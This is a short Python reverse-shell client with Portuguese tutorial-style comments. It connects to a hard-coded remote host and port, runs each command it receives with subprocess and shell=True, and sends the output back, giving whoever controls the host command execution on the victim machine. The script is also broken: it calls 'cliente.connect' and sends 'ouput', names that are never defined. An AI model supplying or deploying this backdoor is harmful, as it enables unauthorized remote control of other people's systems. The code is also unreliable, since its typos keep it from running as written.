import socket 
# crianddo um processo que fica em execução
import subprocess

# Abaixo você vai colocar o IP e a porta para fazer a conexão
REMOTE_HOST = '10.0.0.115' # '192.168.43.82'
REMOTE_PORT = 8081 # 2222
# Aqui você configura o socket
client = socket.socket()
print("[-] Connection Initiating...")
# configura a conexão do socket para o host e a porta definida
cliente.connect((REMOTE_HOST, REMOTE_PORT))
print("[-] Connection initiated!")

# Cria um laço verdadeiro  para habilitar a shell
while True:
    print("[-] Awaiting commands...")
    # enviando comandos do tamanho de 1024
    command = client.recv(1024)
    # aqui ele processa o comando descriptografado
    command = command.decode()
    # Aqui ele cria um processo que abre o prompt de comando ou a shell linux 
    op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
    # Saida do comando
    output = op.stdout.read()
    output_error = op.stderr.read()
    print("[-] Sending response....")
    # Envio da saida do comando para o server
    client.send(ouput + output_error)
